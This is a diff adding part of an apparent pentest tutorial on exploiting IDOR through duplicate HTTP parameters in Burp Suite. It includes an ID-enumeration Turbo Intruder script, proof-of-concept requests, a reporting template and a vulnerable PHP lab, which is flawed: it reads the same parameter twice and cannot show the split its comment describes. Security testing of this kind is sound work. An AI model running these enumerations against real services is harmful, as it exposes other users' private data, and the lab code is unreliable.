+2. **Add duplicate parameter**:
+   - In Repeater, locate the parameter in request
+   - Add `&id=101` at the end
+   - Send and compare response
+
+3. **Check response differences**:
+   - Look for data from victim (id=101)
+   - Check if response matches id=101's data
+   - Verify you're still authenticated as id=100
+
+#### **Step 3.2: Parameter Location Variations**
+
+Test duplicates in different positions:
+
+```
+# URL Query String
+GET /api/user?id=100&id=101
+
+# POST Body (application/x-www-form-urlencoded)
+POST /api/user
+Content-Type: application/x-www-form-urlencoded
+
+id=100&id=101
+
+# POST Body + URL
+GET /api/user?id=100
+POST /api/user
+id=101
+
+# JSON Body
+POST /api/user
+Content-Type: application/json
+
+{"id":100, "id":101}  // Note: JSON usually uses last value
+```
+
+---
+
+### **PHASE 4: Automated Testing with Burp Intruder**
+
+#### **Step 4.1: Set Up Intruder Attack**
+
+1. **Send request to Intruder**:
+   - Right-click → **Send to Intruder**
+
+2. **Configure Payload Positions**:
+   - Go to **Positions** tab
+   - Clear all payload positions (Click "Clear §")
+   - Add positions for duplicate parameters:
+
+```
+GET /api/user?id=§100§&id=§101§
+```
+
+3. **Alternative: Two separate positions**:
+```
+GET /api/user?id=§100§&id=§101§
+```
+
+#### **Step 4.2: Payload Configuration**
+
+**Payload Set 1 (First ID - Your ID):**
+- Payload type: **Numbers**
+- From: Your ID (e.g., 100)
+- To: Your ID (100)
+- Step: 1
+
+**Payload Set 2 (Second ID - Target IDs):**
+- Payload type: **Numbers** or **Simple list**
+- From: 1 to 1000
+- Or use a wordlist of potential IDs
+
+#### **Step 4.3: Attack Types**
+
+**Sniper Attack** (if testing one variable):
+```
+?id=§100§&id=101  → Tests changing first ID
+?id=100&id=§101§  → Tests changing second ID
+```
+
+**Battering Ram** (same value in both):
+```
+?id=§100§&id=§100§  → Both positions get same value
+```
+
+**Pitchfork** (paired values):
+```
+Position 1: 100, 100, 100, 100
+Position 2: 1,   2,   3,   4
+```
+
+**Cluster Bomb** (all combinations):
+```
+Position 1: 100, 100, 100, 101, 101, 101
+Position 2: 1,   2,   3,   1,   2,   3
+```
+
+#### **Step 4.4: Payload Processing Rules**
+
+Add processing rules to enhance testing:
+
+1. **Add encoder rules**:
+   - URL encode all characters
+   - Base64 encode (if API expects encoded)
+
+2. **Add prefix/suffix**:
+   - Add leading zeros: `00100`
+   - Add brackets: `id[100]`
+
+3. **Hash payloads**:
+   - If IDs are hashed, try common hashes
+
+---
+
+### **PHASE 5: Advanced Burp Techniques**
+
+#### **Step 5.1: Using Burp Comparer**
+
+1. **Collect responses**:
+   - Send requests for `id=100` (your resource)
+   - Send requests for `id=101` (victim resource)
+   - Send duplicate param requests
+
+2. **Compare responses**:
+   - Select two responses in **Target** → **Site map**
+   - Right-click → **Send to Comparer**
+   - Analyze differences
+
+#### **Step 5.2: Burp Scanner - Active Scan with Custom Insertion Points**
+
+1. **Define custom insertion points**:
+   - Go to **Scanner** → **Insertion points**
+   - Add rule for duplicate parameters
+
+2. **Create scan configuration**:
+   - **Scanner** → **Scan configuration**
+   - Enable **Parameter pollution checks**
+   - Customize payloads
+
+#### **Step 5.3: Extender - Useful Extensions**
+
+Install these extensions for better testing:
+
+1. **Paramalyzer** - Tracks parameter usage
+2. **Hackvertor** - Advanced encoding/decoding
+3. **Turbo Intruder** - High-speed attacks
+4. **Copy As Python-Requests** - Export for custom scripts
+5. **Param Miner** - Discovers hidden parameters
+
+**Turbo Intruder Script Example:**
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    
+    for i in range(1, 1000):
+        engine.queue(target.req, [
+            f'id=100&id={i}',
+            f'id={i}&id=100'
+        ])
+
+def handleResponse(req, interesting):
+    if 'unauthorized' not in req.response.lower():
+        table.add(req)
+```
+
+---
+
+### **PHASE 6: Detection & Validation**
+
+#### **Step 6.1: Response Analysis Checklist**
+
+✅ **Status Code Changes**:
+- 200 vs 403/404
+- 302 Redirects
+
+✅ **Response Length**:
+- Compare with baseline
+- Use **Intruder** → **Results** → **Sort by length**
+
+✅ **Content Differences**:
+- Personal information
+- Usernames/emails
+- Transaction data
+- File names/paths
+
+✅ **Timing Differences**:
+- Valid resources might take longer
+- Use **Intruder** → **Results** → **Sort by response time**
+
+#### **Step 6.2: False Positive Validation**
+
+For each potential finding:
+
+1. **Replicate manually** in Repeater
+2. **Incognito test** - Log out, try accessing
+3. **Different user account** - Test with another account
+4. **Check authorization context** - Are you supposed to access this?
+5. **Verify data ownership** - Does the data belong to another user?
+
+#### **Step 6.3: Impact Assessment**
+
+Document for each finding:
+- **Data exposed**: What information?
+- **Actions possible**: Can you modify/delete?
+- **User base affected**: All users? Specific roles?
+- **Business impact**: Financial? Privacy? Reputation?
+- **Attack complexity**: Easy to exploit?
+
+---
+
+### **PHASE 7: Exploitation & Proof of Concept**
+
+#### **Step 7.1: Create Exploit Proof**
+
+**Browser-based PoC** (if GET request):
+```html
+<img src="https://target.com/api/user?id=100&id=101">
+```
+
+**JavaScript PoC**:
+```javascript
+fetch('https://target.com/api/user?id=100&id=101', {
+    credentials: 'include'
+}).then(r => r.text()).then(console.log)
+```
+
+**HTML Form PoC**:
+```html
+<form method="POST" action="https://target.com/api/user">
+    <input type="hidden" name="id" value="100">
+    <input type="hidden" name="id" value="101">
+    <input type="submit" value="Exploit">
+</form>
+```
+
+#### **Step 7.2: Chain with Other Vulnerabilities**
+
+Check if duplicate params IDOR can lead to:
+- **Account takeover** (if profile update)
+- **Privilege escalation** (if admin functions)
+- **Data exfiltration** (mass data access)
+- **Business logic bypass** (order manipulation)
+
+---
+
+## 📊 **Testing Matrix**
+
+Use this matrix to track your testing:
+
+| Endpoint | Method | Normal ID | Test ID | Duplicate Pattern | Response | Vulnerable? |
+|----------|--------|-----------|---------|-------------------|----------|-------------|
+| /api/user | GET | 100 | 101 | 100&101 | User 101 data | YES |
+| /download | GET | 500 | 501 | 500&501 | 403 | NO |
+| /update | POST | 200 | 201 | 200&201 | Success | YES |
+
+---
+
+## 🛠️ **Burp Suite Configuration Tips**
+
+### **Optimize Intruder for IDOR**
+
+1. **Resource Pool**:
+   - Create new resource pool
+   - Set 1 concurrent request (avoid rate limiting)
+   - Set 0 delay between requests
+
+2. **Grep - Extract**:
+   - Add extract rules for usernames/emails
+   - Extract response codes
+   - Extract content-length
+
+3. **Grep - Match**:
+   - Add strings to match: `unauthorized`, `forbidden`, `access denied`
+   - Match personal data patterns
+
+### **Macros for Authentication**
+
+Create macros to handle:
+- Login before testing
+- Session refresh
+- CSRF tokens
+
+1. **Project options** → **Sessions**
+2. **Add** → **Macro** recorder
+3. Record login sequence
+4. Configure session handling rules
+
+---
+
+## ⚠️ **Common Pitfalls & Solutions**
+
+| Pitfall | Solution |
+|---------|----------|
+| Rate limiting | Use delays, rotate IPs (if allowed) |
+| CSRF tokens | Extract with macros |
+| Session expiration | Implement auto-refresh |
+| Large response sets | Use grep -extract filters |
+| False positives | Manual verification |
+
+---
+
+## 📝 **Reporting Template**
+
+```markdown
+# IDOR via HTTP Parameter Pollution (Duplicate Parameters)
+
+## Vulnerability
+The endpoint `/api/user/profile` is vulnerable to IDOR through duplicate parameters.
+
+## Affected Endpoint
+GET /api/user/profile?id=100&id=101
+
+## Impact
+An attacker can view any user's profile by adding their ID as a duplicate parameter.
+
+## Proof of Concept
+1. Log in as user ID 100
+2. Visit: https://target.com/api/user/profile?id=100&id=101
+3. Observe profile data for user 101
+
+## Technical Details
+- Backend: PHP (last parameter wins)
+- Authorization: Checks first parameter
+- Data retrieval: Uses last parameter
+
+## Remediation
+- Use consistent parameter handling
+- Implement server-side access controls
+- Consider using POST with single parameter
+```
+
+---
+
+## 🎯 **Success Indicators**
+
+You've found Bug #26 when:
+- [ ] Normal request shows YOUR data
+- [ ] Duplicate param request shows OTHER user's data
+- [ ] You're still authenticated as YOUR user
+- [ ] No authorization errors received
+- [ ] Response contains victim's private data
+
+---
+
+## 🔬 **Practice Lab Setup**
+
+**Create test environment** (PHP example):
+```php
+<?php
+// Vulnerable code
+$user_id = $_GET['id']; // Gets last parameter
+$auth_user = $_GET['id']; // Gets first parameter? 
+
+// Authorization
+if(!checkAuth($auth_user)) die('Unauthorized');
+
+// Data retrieval
+$data = getUserData($user_id);
+echo json_encode($data);
+?>
+```
+
+---
 
